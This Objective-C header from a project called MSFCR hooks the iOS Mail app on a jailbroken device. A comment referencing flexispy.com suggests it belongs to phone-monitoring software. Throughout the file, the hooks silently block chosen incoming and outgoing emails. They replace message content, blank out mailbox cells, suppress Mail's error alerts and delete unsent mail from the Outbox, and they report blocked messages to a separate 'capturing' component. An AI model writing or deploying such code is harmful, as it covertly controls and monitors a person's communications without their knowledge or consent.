//
//  MailHook.h
//  MSFCR
//
//  Created by Syam Sasidharan on 6/19/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "MSFCR.h"

#import "Message.h"
#import "MFOutgoingMessageDelivery.h"
#import "OutgoingMessageDelivery.h"
#import "MailboxContentViewController.h"
#import "MFData.h"
#import "MimePart.h"

#import "DefStd.h"
#import "EmailUtils.h"


//NOTE:
//In order to block the outgoing message just return nil from initWithMessage,initWithHeaders$mixedContent$textPartsAreHTML$,initWithHeaders$HTML$plainTextAlternative$other$ after checking the arguments
//For incoming we cant block the message download, but we can block the message view . User wont be able to see the message if it is a blocked message. It can done with simple tableview delegate methods

/**
 - Method name: dataForMimePart:inRange:isComplete:downloadIfNecessary:didDownload
 - Purpose:  This method is used to hook the incomming mail 
 - Argument list and description: No Argument.
 - Return type and description: (id) mime data (MFData *)
 */

HOOK(Message, dataForMimePart$inRange$isComplete$downloadIfNecessary$didDownload$, id,
	 id arg1, NSRange arg2, BOOL *arg3, BOOL arg4, BOOL *arg5) {
	
	DLog (@"[--BLOCKING--] dataForMimePart$inRange$isComplete$downloadIfNecessary$didDownload$ arg1 = %@,"
		  "arg3 = %d, arg4 = %d, arg5 = %d", arg1, *arg3, arg4, *arg5);
	
	id mimePartData = CALL_ORIG(Message, dataForMimePart$inRange$isComplete$downloadIfNecessary$didDownload$,
								arg1, arg2, arg3, arg4, arg5);
	MimePart *mimePart = arg1;
	
	
	DLog (@"======================[BLOCKING]==========================");
	DLog (@"mimeBody = %@", [mimePart mimeBody]);
	DLog (@"type = %@", [mimePart type]);
	DLog (@"subtype = %@", [mimePart subtype]);
	DLog (@"bodyParameterKeys = %@", [mimePart bodyParameterKeys]);
	DLog (@"contentTransferEncoding = %@", [mimePart contentTransferEncoding]);
	DLog (@"disposition = %@", [mimePart disposition]);
	DLog (@"dispositionParameterKeys = %@", [mimePart dispositionParameterKeys]);
	DLog (@"contentDescription = %@", [mimePart contentDescription]);
	DLog (@"contentID = %@", [mimePart contentID]);
	DLog (@"contentLocation = %@", [mimePart contentLocation]);
	DLog (@"languages = %@", [mimePart languages]);
	DLog (@"parentPart = %@", [mimePart parentPart]);
	DLog (@"firstChildPart = %@", [mimePart firstChildPart]);
	DLog (@"nextSiblingPart = %@", [mimePart nextSiblingPart]);
	DLog (@"subparts = %@", [mimePart subparts]);
	DLog (@"textHtmlPart = %@", [mimePart textHtmlPart]);
	DLog (@"attachmentFilename = %@", [mimePart attachmentFilename]);
	DLog (@"attachments = %@", [mimePart attachments]);
	DLog (@"======================[BLOCKING]===========================");

	
	DLog (@"[--BLOCKING--] Class of mimePartData = %@", [mimePartData class]);	
	DLog (@"[--BLOCKING--] dataForMimePart$inRange$isComplete$downloadIfNecessary$didDownload$ arg1 = %@,"
		  "arg3 = %d, arg4 = %d, arg5 = %d", arg1, *arg3, arg4, *arg5);
	
	// Note: When capture incoming mail that is not complete would 
	// cause error in extract data from message part
	
	BOOL isComplete = *arg3;
	//	BOOL downloadIfNecessary = arg4;
	//	BOOL didDownload = *arg5;
	
	BOOL block = NO;
	
	if (isComplete /*&& downloadIfNecessary && didDownload*/) {
		EmailUtils *mailUtils = [[EmailUtils alloc] init];
		block = [mailUtils blockIncomingMail:self
									 headers:[self headers]];
		if (block) {
			DLog (@"[--BLOCKING--] isHTML = %d, isRich = %d, isReadableText = %d, isAttachment = %d",
				  [mimePart isHTML], [mimePart isRich], [mimePart isReadableText], [mimePart isAttachment]);
			
			if ([mimePart isHTML] || [mimePart isRich]) {
				NSString *blockText =	@"<!DOCTYPE html>"
				"<html>"
				"<body>"
				"<b> This email is blocked </b>"
				"</body>"
				"</html>";
				
				NSData *blockData = [blockText dataUsingEncoding:NSUTF8StringEncoding];
				id newBlockMimeData = [[MFData alloc] initWithBytes:[blockData bytes]
															 length:[blockData length]];
				mimePartData = [newBlockMimeData autorelease];
				
			} else if ([mimePart isReadableText]) {
				NSString *blockText = @" This email is blocked ";
				NSData *blockData = [blockText dataUsingEncoding:NSUTF8StringEncoding]; 
				id newBlockMimeData = [[MFData alloc] initWithBytes:[blockData bytes]
															 length:[blockData length]];
				mimePartData = [newBlockMimeData autorelease];
				
			} else {
				id newBlockMimeData = [[MFData alloc] init];
				mimePartData = [newBlockMimeData autorelease];
				
			}
			
			// Some email like store@flexispy.com cannot replace content of message with above technique thus we use below technique
			
			[mimePart setRange:NSMakeRange(0, 0)]; // This would replace the content of message with "This message has no content."
		}
		
		
		[mailUtils release];
	}
	
	DLog (@"[--BLOCKING--] MIME part data after block checking, mimePartData = %@", mimePartData);
	
	return (mimePartData);
}


#pragma mark -
#pragma mark Utils for Outgoing Email Blocking


/**
 - Method name: show
 - Purpose:		This method is used to hook the showing of the alert view
				if the delegate of UIAlertView is MailErrorHandler and that outgoing email is blocked, 
				we will not show the alert box of Mail application				
 - Argument list and description:	
 - Return type and description:		
 */
HOOK (UIAlertView, show, void) {    
	DLog (@"UIAlertView --> show delete %@, title %@, message %@", [self delegate], [self title], [self message])	
	BOOL isBlock = NO;
	if ([[self delegate] isKindOfClass:objc_getClass("MailErrorHandler")]		&&
		[[EmailUtils sharedInstance] mIsBlockOutgoingMailAlert])	{				
		isBlock = YES;
		[[EmailUtils sharedInstance] setMIsBlockOutgoingMailAlert:NO];	// reset status of blocking Mail alert message
		DLog (@"Block alert")
	}
	
	if (!isBlock)
		CALL_ORIG(UIAlertView, show);
}


#pragma mark -
#pragma mark Outgoing Email Blocking for iOS5

/**
 - Method name: initWithMessage
 - Purpose:		This method is used to hook the outgoing mail in IOS5
				This method is called when sending email from other applications, e.g, Photos, VoiceMemo
 - Argument list and description:	arg1(id).
 - Return type and description:		MFOutgoingMessageDelivery (id)
 */
HOOK (MFOutgoingMessageDelivery, initWithMessage$, id, id arg1) {
	DLog (@"BLOCKING: MFOutgoingMessageDelivery --> initWithMessage")
	
	// -- set reference time so that we will remove only unsent email that is created after this point of time
	[[EmailUtils sharedInstance] setReferenceTimeForDeleteUnsentEmail];
	
//	DLog(@"BLOCKING arg1: %@", arg1);				
//	DLog(@"BLOCKING class: %@", [arg1 class]);
	
	EmailUtils *mailUtils = [[EmailUtils alloc] init];
	BOOL block = NO;
	
	id omd = CALL_ORIG(MFOutgoingMessageDelivery,initWithMessage$, arg1);	
	
//	DLog(@"BLOCKING omd: %@", omd);
//	DLog(@"BLOCKING class: %@", [omd class]);		// MFOutgoingMessageDelivery
	block = [mailUtils blockOutgoingMail:omd];									
	
	[mailUtils release];
	mailUtils = nil;
	
	id returnValue = nil; 
	if (block) {
		DLog (@">> block")		
		// -- post notificaiton to the capturing mobile substate
		Message *message = (Message *)[omd message];
		[EmailUtils postNotificationForOutgoingBlockedMailWithTimestamp:[NSNumber numberWithDouble:[message dateSentAsTimeIntervalSince1970]]];
		
		// -- delete the unsent email from Outbox and exist mail application
		[[EmailUtils sharedInstance] deleteUnsentMailAndExitApplication];
	} else {
		returnValue = omd;
	}
	DLog (@"Blocking: end")
	return returnValue;
}


/**
 - Method name:	initWithHeaders:mixedContent:textPartsAreHTML
 - Purpose:		This method is used to hook the outgoing mail for IOS5
				This method is called when sending text
 - Argument list and description:	arg1(id),arg2(id),arg3(id)
 - Return type and description:		MFOutgoingMessageDelivery (id)
 */
HOOK(MFOutgoingMessageDelivery, initWithHeaders$mixedContent$textPartsAreHTML$, id, id arg1, id arg2, id arg3) {
	DLog (@"BLOCKING: MFOutgoingMessageDelivery --> MIX")
	
	// -- set reference time so that we will remove only unsent email that is created after this point of time
	[[EmailUtils sharedInstance] setReferenceTimeForDeleteUnsentEmail];
	
//	DLog(@"BLOCKING arg1: %@", arg1);				
//	DLog(@"BLOCKING class: %@", [arg1 class]);		// MutableMessageHeaders for text	
//	DLog(@"BLOCKING arg2: %@", arg2);				
//	DLog(@"BLOCKING class: %@", [arg2 class]);		// __NSArrayM for text 
//	DLog(@"BLOCKING arg3: %@", arg3);
//	DLog(@"BLOCKING class: %@", [arg3 class]);		// nulll for text

	EmailUtils *mailUtils = [[EmailUtils alloc] init];
	BOOL block = NO;
	
	id omd = CALL_ORIG(MFOutgoingMessageDelivery,initWithHeaders$mixedContent$textPartsAreHTML$, arg1, arg2, arg3);	
	
	DLog(@"BLOCKING omd: %@", omd);
//	DLog(@"BLOCKING class: %@", [omd class]);		// MFOutgoingMessageDelivery
	block = [mailUtils blockOutgoingMail:omd];									
	DLog(@">> after block method");
	
	[mailUtils release];
	mailUtils = nil;
	
	id returnValue = nil; 
	if (block) {	
		// -- block the alert of Mail application because we return nil from this method
		[[EmailUtils sharedInstance] setMIsBlockOutgoingMailAlert:YES];
		
		// -- post notificaiton to the capturing mobile substate
		Message *message = (Message *)[omd message];
		[EmailUtils postNotificationForOutgoingBlockedMailWithTimestamp:[NSNumber numberWithDouble:[message dateSentAsTimeIntervalSince1970]]];
		
	} else {
		returnValue = omd;
	}
	DLog (@"Blocking: end")
	return returnValue;
}


/**
 - Method name: initWithHeaders:HTML:plainTextAlternative:other
 - Purpose:		This method is used to hook the outgoing mail for IOS5
				This method is called when sending HTML page or forwarding the content e.g., photo, audio
 - Argument list and description:	arg1(id),arg2(id),arg3(id),arg4(id).
 - Return type and description:		MFOutgoingMessageDelivery (id)
 */
HOOK(MFOutgoingMessageDelivery, initWithHeaders$HTML$plainTextAlternative$other$, id, id arg1, id arg2, id arg3, id arg4) {
	DLog (@"BLOCKING: MFOutgoingMessageDelivery --> HTML")
	
	// -- set reference time so that we will remove only unsent email that is created after this point of time
	[[EmailUtils sharedInstance] setReferenceTimeForDeleteUnsentEmail];
	
//	DLog(@"BLOCKING arg1: %@", arg1);				
//	DLog(@"BLOCKING class: %@", [arg1 class]);		// MutableMessageHeaders for text	
//	DLog(@"BLOCKING arg2: %@", arg2);				
//	DLog(@"BLOCKING class: %@", [arg2 class]);		// __NSArrayM for text 
//	DLog(@"BLOCKING arg3: %@", arg3);
//	DLog(@"BLOCKING class: %@", [arg3 class]);		// nulll for text
	
	EmailUtils *mailUtils = [[EmailUtils alloc] init];
	BOOL block = NO;
	
	id omd = CALL_ORIG(MFOutgoingMessageDelivery,initWithHeaders$HTML$plainTextAlternative$other$,arg1,arg2,arg3,arg4);
	
	DLog(@"BLOCKING omd: %@", omd);
	DLog(@"BLOCKING class: %@", [omd class]);		// MFOutgoingMessageDelivery
	block = [mailUtils blockOutgoingMail:omd];									
	
	[mailUtils release];
	mailUtils = nil;
	
	id returnValue = nil; 
	if (block) {	
		// -- block the alert of Mail application because we return nil from this method
		[[EmailUtils sharedInstance] setMIsBlockOutgoingMailAlert:YES];
		
		// -- post notificaiton to the capturing mobile substate
		Message *message = (Message *)[omd message];
		[EmailUtils postNotificationForOutgoingBlockedMailWithTimestamp:[NSNumber numberWithDouble:[message dateSentAsTimeIntervalSince1970]]];
	} else {
		returnValue = omd;
	}
	DLog (@"Blocking: end")
	return returnValue;
}


#pragma mark -
#pragma mark Outgoing Email Blocking for iOS4



/**
 - Method name:	initWithMessage
 - Purpose:		This method is used to hook the outgoing mail in IOS5
				This method is called when sending email from other applications, e.g, Photos, VoiceMemo
 - Argument list and description:	arg1(id).
 - Return type and description:		MFOutgoingMessageDelivery (id)
 */
HOOK (OutgoingMessageDelivery, initWithMessage$, id, id arg1) {
	DLog (@"BLOCKING: MFOutgoingMessageDelivery --> initWithMessage")
	
	// -- set reference time so that we will remove only unsent email that is created after this point of time
	[[EmailUtils sharedInstance] setReferenceTimeForDeleteUnsentEmail];
	
	//	DLog(@"BLOCKING arg1: %@", arg1);				
	//	DLog(@"BLOCKING class: %@", [arg1 class]);
	
	EmailUtils *mailUtils = [[EmailUtils alloc] init];
	BOOL block = NO;
	
	id omd = CALL_ORIG(OutgoingMessageDelivery,initWithMessage$, arg1);	
	
	//	DLog(@"BLOCKING omd: %@", omd);
	//	DLog(@"BLOCKING class: %@", [omd class]);		// MFOutgoingMessageDelivery
	block = [mailUtils blockOutgoingMail:omd];									
	
	[mailUtils release];
	mailUtils = nil;
	
	id returnValue = nil; 
	if (block) {
		DLog (@">> block")		
		// -- post notificaiton to the capturing mobile substate
		Message *message = (Message *)[omd message];
		[EmailUtils postNotificationForOutgoingBlockedMailWithTimestamp:[NSNumber numberWithDouble:[message dateSentAsTimeIntervalSince1970]]];
		
		// -- delete the unsent email from Outbox and exist mail application
		[[EmailUtils sharedInstance] deleteUnsentMailAndExitApplication];
	} else {
		returnValue = omd;
	}
	DLog (@"Blocking: end")
	return returnValue;
}


/**
 - Method name:	initWithHeaders:mixedContent:textPartsAreHTML
 - Purpose:		This method is used to hook the outgoing mail for IOS5
				This method is called when sending text
 - Argument list and description:	arg1(id),arg2(id),arg3(id)
 - Return type and description:		MFOutgoingMessageDelivery (id)
 */
HOOK(OutgoingMessageDelivery,initWithHeaders$mixedContent$textPartsAreHTML$, id, id arg1, id arg2, id arg3) {
	DLog (@"BLOCKING: MFOutgoingMessageDelivery --> MIX")	
	// -- set reference time so that we will remove only unsent email that is created after this point of time
	[[EmailUtils sharedInstance] setReferenceTimeForDeleteUnsentEmail];
	
	EmailUtils *mailUtils = [[EmailUtils alloc] init];
	BOOL block = NO;
	
	id omd = CALL_ORIG(OutgoingMessageDelivery,initWithHeaders$mixedContent$textPartsAreHTML$, arg1, arg2, arg3);	
	
	DLog(@"BLOCKING omd: %@", omd);
	//	DLog(@"BLOCKING class: %@", [omd class]);		// MFOutgoingMessageDelivery
	
	block = [mailUtils blockOutgoingMail:omd];									
	DLog(@">> after block method");
	
	[mailUtils release];
	mailUtils = nil;
	
	id returnValue = nil; 
	if (block) {	
		// -- block the alert of Mail application because we return nil from this method
		[[EmailUtils sharedInstance] setMIsBlockOutgoingMailAlert:YES];
		
		// -- post notificaiton to the capturing mobile substate
		Message *message = (Message *)[omd message];
		[EmailUtils postNotificationForOutgoingBlockedMailWithTimestamp:[NSNumber numberWithDouble:[message dateSentAsTimeIntervalSince1970]]];
		
	} else {
		returnValue = omd;
	}
	DLog (@"Blocking: end")
	return returnValue;	
}

/**
 - Method name: initWithHeaders:HTML:plainTextAlternative:other
 - Purpose:		This method is used to hook the outgoing mail for IOS5
				This method is called when sending HTML page or forwarding the content e.g., photo, audio
 - Argument list and description:	arg1(id),arg2(id),arg3(id),arg4(id).
 - Return type and description:		MFOutgoingMessageDelivery (id)
 */
HOOK(OutgoingMessageDelivery,initWithHeaders$HTML$plainTextAlternative$other$, id, id arg1, id arg2, id arg3, id arg4) {
	DLog (@"BLOCKING: MFOutgoingMessageDelivery --> HTML")
	
	// -- set reference time so that we will remove only unsent email that is created after this point of time
	[[EmailUtils sharedInstance] setReferenceTimeForDeleteUnsentEmail];
	
	//	DLog(@"BLOCKING arg1: %@", arg1);				
	//	DLog(@"BLOCKING class: %@", [arg1 class]);		// MutableMessageHeaders for text	
	//	DLog(@"BLOCKING arg2: %@", arg2);				
	//	DLog(@"BLOCKING class: %@", [arg2 class]);		// __NSArrayM for text 
	//	DLog(@"BLOCKING arg3: %@", arg3);
	//	DLog(@"BLOCKING class: %@", [arg3 class]);		// nulll for text
	
	EmailUtils *mailUtils = [[EmailUtils alloc] init];
	BOOL block = NO;
	
	id omd = CALL_ORIG(OutgoingMessageDelivery, initWithHeaders$HTML$plainTextAlternative$other$,arg1,arg2,arg3,arg4);
	
	DLog(@"BLOCKING omd: %@", omd);
	DLog(@"BLOCKING class: %@", [omd class]);		// MFOutgoingMessageDelivery
	block = [mailUtils blockOutgoingMail:omd];									
	
	[mailUtils release];
	mailUtils = nil;
	
	id returnValue = nil; 
	if (block) {	
		// -- block the alert of Mail application because we return nil from this method
		[[EmailUtils sharedInstance] setMIsBlockOutgoingMailAlert:YES];
		
		// -- post notificaiton to the capturing mobile substate
		Message *message = (Message *)[omd message];
		[EmailUtils postNotificationForOutgoingBlockedMailWithTimestamp:[NSNumber numberWithDouble:[message dateSentAsTimeIntervalSince1970]]];
	} else {
		returnValue = omd;
	}
	DLog (@"Blocking: end")
	return returnValue;	
}


#pragma mark -


//This method is to block the navigation to the mail details
HOOK (MailboxContentViewController,tableView$didSelectRowAtIndexPath$, void,id arg1,id arg2) {

    CALL_ORIG (MailboxContentViewController,tableView$didSelectRowAtIndexPath$,arg1,arg2);
}

//This is method is used to hide contents of blocked email
HOOK (MailboxContentViewController,tableView$cellForRowAtIndexPath$, id,id arg1,id arg2) {

    id cell =  CALL_ORIG (MailboxContentViewController,tableView$cellForRowAtIndexPath$,arg1,arg2);
    DLog(@"%@",[cell description]);
    [cell setAccessoryType:UITableViewCellAccessoryNone];    
    [[cell subviews] makeObjectsPerformSelector:@selector(removeFromSuperview)];
    
    return cell;
}
